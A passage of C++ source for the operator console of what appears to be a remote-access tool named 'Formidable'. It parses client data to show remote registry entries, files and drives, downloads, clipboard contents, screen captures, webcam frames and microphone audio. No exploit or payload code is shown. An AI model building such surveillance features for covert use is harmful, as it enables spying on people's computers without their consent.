                     tvis.item.pszText = (LPWSTR)wKey.c_str();
                     tvis.item.cChildren = 1;
                     tvis.item.lParam = (LPARAM)rootIdx; // 继承根键索引
                     TreeView_InsertItem(hTree, &tvis);
                 }
                 TreeView_Expand(hTree, hSelected, TVE_EXPAND);
             }
        } else if (pkg->arg2 == 2) { // Values for List (Updated from 1 to 2 to match module)
            ListView_DeleteAllItems(hList);
            int index = 0;
            while (std::getline(ss, line)) {
                if (line.empty()) continue;
                // 格式: V|值名|类型字符串|数据
                size_t p1 = line.find('|');
                size_t p2 = line.find('|', p1 + 1);
                size_t p3 = line.find('|', p2 + 1);
                if (p1 != std::string::npos && p2 != std::string::npos && p3 != std::string::npos) {
                    std::wstring wName = Utils::StringHelper::UTF8ToWide(line.substr(p1 + 1, p2 - p1 - 1));
                    std::wstring wType = Utils::StringHelper::UTF8ToWide(line.substr(p2 + 1, p3 - p2 - 1));
                    std::wstring wData = Utils::StringHelper::UTF8ToWide(line.substr(p3 + 1));

                    LVITEMW lvi = { 0 };
                    lvi.mask = LVIF_TEXT | LVIF_PARAM;
                    lvi.iItem = index;
                    lvi.pszText = (LPWSTR)wName.c_str();
                    lvi.lParam = index;
                    int idx = (int)SendMessageW(hList, LVM_INSERTITEMW, 0, (LPARAM)&lvi);
                    
                    ListView_SetItemText(hList, idx, 1, (LPWSTR)wType.c_str());
                    ListView_SetItemText(hList, idx, 2, (LPWSTR)wData.c_str());
                    index++;
                }
            }
        }
    }
}

void CommandHandler::HandleDriveList(uint32_t clientId, const Formidable::CommandPkg* pkg, int iLength) {
    std::shared_ptr<Formidable::ConnectedClient> client;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        if (!g_Clients.count(clientId)) return;
        client = g_Clients[clientId];
    }

    if (client->hFileDlg && IsWindow(client->hFileDlg)) {
        HWND hList = GetDlgItem(client->hFileDlg, IDC_LIST_FILE_REMOTE);
        ListView_DeleteAllItems(hList);
        SendMessage(hList, WM_SETREDRAW, FALSE, 0);

        std::string data(pkg->data, pkg->arg1);
        std::stringstream ss(data);
        std::string line;
        int index = 0;

        while (std::getline(ss, line)) {
            if (line.empty()) continue;
            // Name|Type
            size_t pos = line.find('|');
            if (pos == std::string::npos) continue;
            
            std::string name = line.substr(0, pos);
            std::string type = line.substr(pos + 1);
            
            std::wstring wName = Utils::StringHelper::UTF8ToWide(name);
            std::wstring wType = Utils::StringHelper::UTF8ToWide(type);
            
            // Icon
            SHFILEINFOW sfi = { 0 };
            SHGetFileInfoW(wName.c_str(), 0, &sfi, sizeof(sfi), SHGFI_SYSICONINDEX | SHGFI_SMALLICON);
            
            LVITEMW lvi = { 0 };
            lvi.mask = LVIF_TEXT | LVIF_IMAGE | LVIF_PARAM;
            lvi.iItem = index;
            lvi.pszText = (LPWSTR)wName.c_str();
            lvi.iImage = sfi.iIcon;
            lvi.lParam = index;
            
            int idx = (int)SendMessageW(hList, LVM_INSERTITEMW, 0, (LPARAM)&lvi);
            ListView_SetItemText(hList, idx, 2, (LPWSTR)wType.c_str()); // Type column
            
            index++;
        }
        SendMessage(hList, WM_SETREDRAW, TRUE, 0);
    }
}

void CommandHandler::HandleFileList(uint32_t clientId, const Formidable::CommandPkg* pkg, int iLength) {
    std::shared_ptr<Formidable::ConnectedClient> client;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        if (!g_Clients.count(clientId)) return;
        client = g_Clients[clientId];
    }

    if (client->hFileDlg && IsWindow(client->hFileDlg)) {
        HWND hList = GetDlgItem(client->hFileDlg, IDC_LIST_FILE_REMOTE);
        ListView_DeleteAllItems(hList);
        SendMessage(hList, WM_SETREDRAW, FALSE, 0);

        std::string data(pkg->data, pkg->arg1);
        std::stringstream ss(data);
        std::string line;
        int index = 0;

        while (std::getline(ss, line)) {
            if (line.empty()) continue;

            // 格式: [DIR/FILE]|Name|Size|Time
            size_t p1 = line.find('|');
            size_t p2 = line.find('|', p1 + 1);
            size_t p3 = line.find('|', p2 + 1);

            if (p1 != std::string::npos && p2 != std::string::npos && p3 != std::string::npos) {
                std::string typeStr = line.substr(0, p1);
                std::string nameStr = line.substr(p1 + 1, p2 - p1 - 1);
                std::string sizeStr = line.substr(p2 + 1, p3 - p2 - 1);
                std::string timeStr = line.substr(p3 + 1);

                bool isDir = (typeStr == "[DIR]");
                std::wstring wName = Formidable::Utils::StringHelper::UTF8ToWide(nameStr);
                
                // 获取正确的文件图标索引
                SHFILEINFOW sfi = { 0 };
                DWORD flags = SHGFI_SYSICONINDEX | SHGFI_SMALLICON | SHGFI_USEFILEATTRIBUTES;
                DWORD attr = isDir ? FILE_ATTRIBUTE_DIRECTORY : FILE_ATTRIBUTE_NORMAL;
                SHGetFileInfoW(wName.c_str(), attr, &sfi, sizeof(sfi), flags);
                
                LVITEMW lvi = { 0 };
                lvi.mask = LVIF_TEXT | LVIF_IMAGE | LVIF_PARAM;
                lvi.iItem = index;
                lvi.pszText = (LPWSTR)wName.c_str();
                lvi.lParam = index;
                lvi.iImage = sfi.iIcon;

                int idx = (int)SendMessageW(hList, LVM_INSERTITEMW, 0, (LPARAM)&lvi);
                
                LVITEMW lviSet = { 0 };
                // 大小列 (第1列)
                std::wstring wSize;
                if (isDir) {
                    wSize = L"<DIR>";
                } else {
                    unsigned long long size = std::stoull(sizeStr);
                    if (size > 1024 * 1024 * 1024)
                        wSize = std::to_wstring(size / (1024 * 1024 * 1024)) + L" GB";
                    else if (size > 1024 * 1024)
                        wSize = std::to_wstring(size / (1024 * 1024)) + L" MB";
                    else if (size > 1024)
                        wSize = std::to_wstring(size / 1024) + L" KB";
                    else
                        wSize = std::to_wstring(size) + L" B";
                }
                lviSet.iSubItem = 1; lviSet.pszText = (LPWSTR)wSize.c_str();
                SendMessageW(hList, LVM_SETITEMTEXTW, idx, (LPARAM)&lviSet);

                // 类型列 (第2列)
                std::wstring wType = isDir ? L"文件夹" : L"文件";
                lviSet.iSubItem = 2; lviSet.pszText = (LPWSTR)wType.c_str();
                SendMessageW(hList, LVM_SETITEMTEXTW, idx, (LPARAM)&lviSet);

                // 修改时间列 (第3列)
                std::wstring wTime = Formidable::Utils::StringHelper::UTF8ToWide(timeStr);
                lviSet.iSubItem = 3; lviSet.pszText = (LPWSTR)wTime.c_str();
                SendMessageW(hList, LVM_SETITEMTEXTW, idx, (LPARAM)&lviSet);
                
                index++;
            }
        }
        SendMessage(hList, WM_SETREDRAW, TRUE, 0);
    }
}

void CommandHandler::HandleProcessKill(uint32_t clientId, const Formidable::CommandPkg* pkg, int iLength) {
    std::string status(pkg->data, pkg->arg1);
    if (status != "OK") {
        MessageBoxW(g_hMainWnd, L"终止进程失败", L"错误", MB_OK | MB_ICONERROR);
    }
}

void CommandHandler::HandleFileData(uint32_t clientId, const Formidable::CommandPkg* pkg, int iLength) {
    std::shared_ptr<Formidable::ConnectedClient> client;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        if (!g_Clients.count(clientId)) return;
        client = g_Clients[clientId];
    }

    if (client->hFileDownload != INVALID_HANDLE_VALUE) {
        DWORD dwWritten = 0;
        WriteFile(client->hFileDownload, pkg->data, pkg->arg1, &dwWritten, NULL);

        // Update progress
        client->currentDownloadSize += pkg->arg1;
        if (client->totalDownloadSize > 0) {
            int progress = (int)((client->currentDownloadSize * 100) / client->totalDownloadSize);
            PostMessageW(client->hFileDlg, WM_UPDATE_PROGRESS, progress, 0);
        }
    }
}

void CommandHandler::HandleFileDownload(uint32_t clientId, const Formidable::CommandPkg* pkg, int iLength) {
    std::shared_ptr<Formidable::ConnectedClient> client;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        if (!g_Clients.count(clientId)) return;
        client = g_Clients[clientId];
    }

    std::string status(pkg->data, pkg->arg1);
    if (status == "FINISH") {
        if (client->hFileDownload != INVALID_HANDLE_VALUE) {
            CloseHandle(client->hFileDownload);
            client->hFileDownload = INVALID_HANDLE_VALUE;
            
            // Finish progress
            PostMessageW(client->hFileDlg, WM_UPDATE_PROGRESS, 100, 0);
            
            MessageBoxW(client->hFileDlg, L"文件下载完成", L"提示", MB_OK);
        }
    } else if (status == "Cannot open file for reading") {
        if (client->hFileDownload != INVALID_HANDLE_VALUE) {
            CloseHandle(client->hFileDownload);
            client->hFileDownload = INVALID_HANDLE_VALUE;
        }
        MessageBoxW(client->hFileDlg, L"远程文件无法打开，下载失败", L"错误", MB_ICONERROR);
    }
}

void CommandHandler::HandleClipboard(uint32_t clientId, const Formidable::CommandPkg* pkg, int iLength) {
    std::string text(pkg->data, pkg->arg1);
    std::wstring wText = Utils::StringHelper::UTF8ToWide(text);
    
    if (OpenClipboard(g_hMainWnd)) {
        EmptyClipboard();
        size_t size = (wText.size() + 1) * sizeof(wchar_t);
        HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, size);
        if (hMem) {
            void* p = GlobalLock(hMem);
            if (p) {
                memcpy(p, wText.c_str(), size);
                GlobalUnlock(hMem);
                SetClipboardData(CF_UNICODETEXT, hMem);
            } else {
                GlobalFree(hMem);
            }
        }
        CloseClipboard();
        AddLog(L"剪贴板", L"已同步远程剪贴板内容到本地");
    }
}

void CommandHandler::HandleScreenCapture(uint32_t clientId, const Formidable::CommandPkg* pkg, int iLength) {
    const UINT WM_APP_DESKTOP_FRAME = WM_APP + 220;
    std::shared_ptr<Formidable::ConnectedClient> client;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        if (!g_Clients.count(clientId)) return;
        client = g_Clients[clientId];
    }

    if (client->hDesktopDlg && IsWindow(client->hDesktopDlg)) {
        HWND hStatic = GetDlgItem(client->hDesktopDlg, IDC_STATIC_SCREEN);
        if (hStatic && pkg->arg1 > 0) {
            
            // 解析协议
            bool isDiff = (pkg->arg2 == 1);
            int x = 0, y = 0, w = 0, h = 0;
            BYTE* pData = (BYTE*)pkg->data;
            DWORD dataLen = pkg->arg1;

            if (isDiff) {
                if (dataLen < 16) return;
                memcpy(&x, pData, 4);
                memcpy(&y, pData + 4, 4);
                memcpy(&w, pData + 8, 4);
                memcpy(&h, pData + 12, 4);
                pData += 16;
                dataLen -= 16;
            }

            // 解码图像数据
            HBITMAP hFragment = NULL;
            bool isBmp = (dataLen > 2 && pData[0] == 'B' && pData[1] == 'M');
            if (isBmp) {
                BITMAPFILEHEADER* pBmpFileHeader = (BITMAPFILEHEADER*)pData;
                BITMAPINFOHEADER* pBmpInfoHeader = (BITMAPINFOHEADER*)(pData + sizeof(BITMAPFILEHEADER));
                BYTE* pBits = (BYTE*)pData + pBmpFileHeader->bfOffBits;
                HDC hdc = GetDC(hStatic);
                hFragment = CreateDIBitmap(hdc, pBmpInfoHeader, CBM_INIT, pBits, (BITMAPINFO*)pBmpInfoHeader, DIB_RGB_COLORS);
                ReleaseDC(hStatic, hdc);
            } else {
                HGLOBAL hGlobal = GlobalAlloc(GMEM_MOVEABLE, dataLen);
                if (hGlobal) {
                    LPVOID pBuf = GlobalLock(hGlobal);
                    if (pBuf) {
                        memcpy(pBuf, pData, dataLen);
                        GlobalUnlock(hGlobal);
                        IStream* pStream = NULL;
                        if (CreateStreamOnHGlobal(hGlobal, TRUE, &pStream) == S_OK) {
                            Bitmap* pBitmap = Bitmap::FromStream(pStream);
                            if (pBitmap && pBitmap->GetLastStatus() == Ok) {
                                pBitmap->GetHBITMAP(Color(0,0,0), &hFragment);
                                delete pBitmap;
                            }
                            pStream->Release();
                        }
                    }
                }
            }

            if (!hFragment) {
                 if (s_screenLogState[clientId] != -1) {
                    AddLog(L"桌面", L"画面解码失败");
                    s_screenLogState[clientId] = -1;
                }
                return;
            }

            // 获取 Fragment 尺寸
            BITMAP bmFrag;
            GetObject(hFragment, sizeof(BITMAP), &bmFrag);

            // 如果是全量包，重置尺寸
            if (!isDiff) {
                w = bmFrag.bmWidth;
                h = bmFrag.bmHeight;
                x = 0;
                y = 0;
            }

            // 检查/初始化 BackBuffer
            HDC hScreenDC = GetDC(NULL);
            bool needRecreate = false;

            if (!client->hScreenBackBuffer) {
                needRecreate = true;
                if (isDiff) {
                    // 只有 Diff 包但没有 BackBuffer，通常不应该发生（除非第一个包就是 Diff 且有 Bug）
                    // 但为了容错，我们假设屏幕大小至少要容纳这个 Fragment
                    // 或者更安全：直接把 Fragment 当作 BackBuffer (如果 (0,0))
                    client->backBufferWidth = w + x;
                    client->backBufferHeight = h + y;
                } else {
                    client->backBufferWidth = w;
                    client->backBufferHeight = h;
                }
            } else if (!isDiff) {
                 // 全量包，尺寸变了需要重建
                 if (w != client->backBufferWidth || h != client->backBufferHeight) {
                     needRecreate = true;
                     client->backBufferWidth = w;
                     client->backBufferHeight = h;
                 }
            }

            if (needRecreate) {
                if (client->hScreenBackBuffer) DeleteObject(client->hScreenBackBuffer);
                if (client->hBackBufferDC) DeleteDC(client->hBackBufferDC);
                
                client->hScreenBackBuffer = CreateCompatibleBitmap(hScreenDC, client->backBufferWidth, client->backBufferHeight);
                client->hBackBufferDC = CreateCompatibleDC(hScreenDC);
                SelectObject(client->hBackBufferDC, client->hScreenBackBuffer);
            }

            // 绘制 Fragment 到 BackBuffer
            HDC hFragDC = CreateCompatibleDC(hScreenDC);
            HBITMAP hOld = (HBITMAP)SelectObject(hFragDC, hFragment);
            
            BitBlt(client->hBackBufferDC, x, y, bmFrag.bmWidth, bmFrag.bmHeight, hFragDC, 0, 0, SRCCOPY);
            
            SelectObject(hFragDC, hOld);
            DeleteDC(hFragDC);
            DeleteObject(hFragment);
            
            // 创建用于显示的副本
            HBITMAP hDisplayBmp = CreateCompatibleBitmap(hScreenDC, client->backBufferWidth, client->backBufferHeight);
            HDC hDisplayDC = CreateCompatibleDC(hScreenDC);
            SelectObject(hDisplayDC, hDisplayBmp);
            BitBlt(hDisplayDC, 0, 0, client->backBufferWidth, client->backBufferHeight, client->hBackBufferDC, 0, 0, SRCCOPY);
            DeleteDC(hDisplayDC);
            ReleaseDC(NULL, hScreenDC);

            HBITMAP hOldBmp = (HBITMAP)SendMessage(hStatic, STM_GETIMAGE, IMAGE_BITMAP, 0);
            if (hOldBmp) DeleteObject(hOldBmp);
            SendMessage(hStatic, STM_SETIMAGE, IMAGE_BITMAP, (LPARAM)hDisplayBmp);
            InvalidateRect(hStatic, NULL, FALSE);
            
            if (s_screenLogState[clientId] != 1) {
                AddLog(L"桌面", isDiff ? L"更新局部画面" : L"更新全屏画面");
                s_screenLogState[clientId] = 1;
            }

            PostMessageW(client->hDesktopDlg, WM_APP_DESKTOP_FRAME, (WPARAM)dataLen, (LPARAM)1);
        }
    }
}

void CommandHandler::HandleVideoStream(uint32_t clientId, const Formidable::CommandPkg* pkg, int iLength) {
    std::shared_ptr<Formidable::ConnectedClient> client;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        if (!g_Clients.count(clientId)) return;
        client = g_Clients[clientId];
    }

    if (client->hVideoDlg && IsWindow(client->hVideoDlg)) {
        HWND hStatic = GetDlgItem(client->hVideoDlg, IDC_STATIC_VIDEO);
        if (hStatic && pkg->arg1 > 0) {
            HBITMAP hBitmap = NULL;
            HGLOBAL hGlobal = GlobalAlloc(GMEM_MOVEABLE, pkg->arg1);
            if (hGlobal) {
                LPVOID pBuf = GlobalLock(hGlobal);
                memcpy(pBuf, pkg->data, pkg->arg1);
                GlobalUnlock(hGlobal);
                IStream* pStream = NULL;
                if (CreateStreamOnHGlobal(hGlobal, TRUE, &pStream) == S_OK) {
                    Gdiplus::Bitmap* pBitmap = Gdiplus::Bitmap::FromStream(pStream);
                    if (pBitmap && pBitmap->GetLastStatus() == Gdiplus::Ok) {
                        pBitmap->GetHBITMAP(Gdiplus::Color(0,0,0), &hBitmap);
                        delete pBitmap;
                    }
                    pStream->Release();
                }
            }
            if (hBitmap) {
                HBITMAP hOldBmp = (HBITMAP)SendMessage(hStatic, STM_GETIMAGE, IMAGE_BITMAP, 0);
                if (hOldBmp) DeleteObject(hOldBmp);
                SendMessage(hStatic, STM_SETIMAGE, IMAGE_BITMAP, (LPARAM)hBitmap);
                InvalidateRect(hStatic, NULL, FALSE);
            }
        }
    }
}

void CommandHandler::HandleVoiceStream(uint32_t clientId, const Formidable::CommandPkg* pkg, int iLength) {
    std::shared_ptr<Formidable::ConnectedClient> client;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        if (!g_Clients.count(clientId)) return;
        client = g_Clients[clientId];
    }

    if (!client->hWaveOut) {
        WAVEFORMATEX wfx = { 0 };
        wfx.wFormatTag = WAVE_FORMAT_PCM;
        wfx.nChannels = 1;
        wfx.nSamplesPerSec = 8000;
        wfx.wBitsPerSample = 16;
        wfx.nBlockAlign = wfx.nChannels * wfx.wBitsPerSample / 8;
        wfx.nAvgBytesPerSec = wfx.nSamplesPerSec * wfx.nBlockAlign;
        wfx.cbSize = 0;
        waveOutOpen(&client->hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    }

    if (!client->hWaveOut) return;

    // PCM 数据直接播放
    WAVEHDR* pWh = (WAVEHDR*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(WAVEHDR));
    if (pWh) {
        pWh->lpData = (LPSTR)HeapAlloc(GetProcessHeap(), 0, pkg->arg1);
        if (pWh->lpData) {
            memcpy(pWh->lpData, pkg->data, pkg->arg1);
            pWh->dwBufferLength = pkg->arg1;
            waveOutPrepareHeader(client->hWaveOut, pWh, sizeof(WAVEHDR));
            waveOutWrite(client->hWaveOut, pWh, sizeof(WAVEHDR));
        } else {
            HeapFree(GetProcessHeap(), 0, pWh);
        }
    }
}

} // namespace Core
} // namespace Formidable
